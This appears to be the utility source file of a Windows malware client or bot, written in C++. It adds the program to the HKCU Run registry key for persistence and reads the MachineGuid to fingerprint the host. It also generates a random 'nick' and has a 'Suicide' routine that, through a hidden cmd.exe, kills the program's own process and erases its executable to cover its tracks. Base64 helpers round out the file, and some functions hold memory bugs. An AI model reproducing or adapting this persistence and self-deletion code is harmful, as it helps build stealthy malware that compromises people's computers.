#include "Utils.h"

#define UNLEN 256

/*
Add to Registry
*/
void Utils::AddToRegistry(string name, string path)
{
	HKEY hkey;

	RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
	RegSetValueExA(hkey, name.c_str(), 0, REG_SZ, (BYTE*)path.c_str(), path.length());
	RegCloseKey(hkey);
}

char* Utils::getRandomNumbers(int Len)
{
	char *nick;
	int i;
	nick = (char *)malloc(Len);
	nick[0] = '\0';
	srand(GetTickCount());
	for (i = 0; i < Len; i++) {
		sprintf(nick, "%s%d", nick, rand() % 10);
	}
	nick[i] = '\0';
	return nick;
}

void Utils::writeFile(const std::string& fileName, const std::string& text)
{
	FILE *f;
	f = fopen(fileName.c_str(), "w");
	ofstream fout(fileName.c_str());
	fout << text.c_str();
	fclose(f);
	fout.close();
}

std::string Utils::getHWID()
{
	HKEY hKey;
	DWORD cData = 255;
	TCHAR MachineGuid[255] = { '\0' };

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", NULL, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
	{
		RegQueryValueEx(hKey, "MachineGuid", NULL, NULL, (LPBYTE)MachineGuid, &cData);
	}

	RegCloseKey(hKey);

	return (string)MachineGuid;
}

vector<string> Utils::listFilesInDirectory(string directoryName)
{
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(directoryName.c_str(), &FindFileData);

	vector<string> listFileNames;
	listFileNames.push_back(FindFileData.cFileName);

	while (FindNextFile(hFind, &FindFileData))
		listFileNames.push_back(FindFileData.cFileName);

	return listFileNames;
}

std::string Utils::getUserName()
{
	char buffer[UNLEN + 1];
	DWORD size;
	size = sizeof(buffer);
	GetUserNameA(buffer, &size);
	std::string userName = buffer;

	return userName;
}

std::string Utils::GetFullPathFromProcId(DWORD pId)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pId);
	char buffer[MAX_PATH];

	if (hProcess != NULL)
	{
		GetModuleFileNameEx(hProcess, NULL, buffer, MAX_PATH);
		CloseHandle(hProcess);
	}

	return buffer;
}

std::string Utils::getProcessName(DWORD pId)
{
	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pId);

	if (NULL != hProcess)
	{
		HMODULE hMod;
		DWORD cbNeeded;

		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
		{
			GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
		}
	}
	CloseHandle(hProcess);

	std::string arr_s = szProcessName;
	return arr_s;
}

std::string Utils::ws2s(const std::wstring& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = WideCharToMultiByte(CP_ACP, 0, s.c_str(), slength, 0, 0, 0, 0);
	char* buf = new char[len];
	WideCharToMultiByte(CP_ACP, 0, s.c_str(), slength, buf, len, 0, 0);
	std::string r(buf);
	delete[] buf;
	return r;
}

std::wstring Utils::s2ws(const std::string& s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	std::wstring r(buf);
	delete[] buf;
	return r;
}

void Utils::Suicide()
{
	std::string command = "/c taskkill /im " + getProcessName(GetCurrentProcessId())
		+ " /f & erase " + GetFullPathFromProcId(GetCurrentProcessId())
		+ " & exit";

	ShellExecute(NULL, 0, "C:\\Windows\\System32\\cmd.exe", command.c_str(), 0, SW_HIDE);
}

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

static inline bool is_base64(unsigned char c) {
	return (isalnum(c) || (c == '+') || (c == '/'));
}

std::string Utils::base64_encode(unsigned char const* bytes_to_encode, unsigned int in_len) {
	std::string ret;
	int i = 0;
	int j = 0;
	unsigned char char_array_3[3];
	unsigned char char_array_4[4];

	while (in_len--) {
		char_array_3[i++] = *(bytes_to_encode++);
		if (i == 3) {
			char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
			char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
			char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
			char_array_4[3] = char_array_3[2] & 0x3f;

			for (i = 0; (i <4); i++)
				ret += base64_chars[char_array_4[i]];
			i = 0;
		}
	}

	if (i)
	{
		for (j = i; j < 3; j++)
			char_array_3[j] = '\0';

		char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
		char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
		char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
		char_array_4[3] = char_array_3[2] & 0x3f;

		for (j = 0; (j < i + 1); j++)
			ret += base64_chars[char_array_4[j]];

		while ((i++ < 3))
			ret += '=';

	}
	return ret;
}

std::string Utils::base64_decode(std::string const& encoded_string) {
	int in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	unsigned char char_array_4[4], char_array_3[3];
	std::string ret;

	while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
		char_array_4[i++] = encoded_string[in_]; in_++;
		if (i == 4) {
			for (i = 0; i <4; i++)
				char_array_4[i] = base64_chars.find(char_array_4[i]);

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; (i < 3); i++)
				ret += char_array_3[i];
			i = 0;
		}
	}

	if (i) {
		for (j = i; j <4; j++)
			char_array_4[j] = 0;

		for (j = 0; j <4; j++)
			char_array_4[j] = base64_chars.find(char_array_4[j]);

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

		for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
	}
	return ret;
}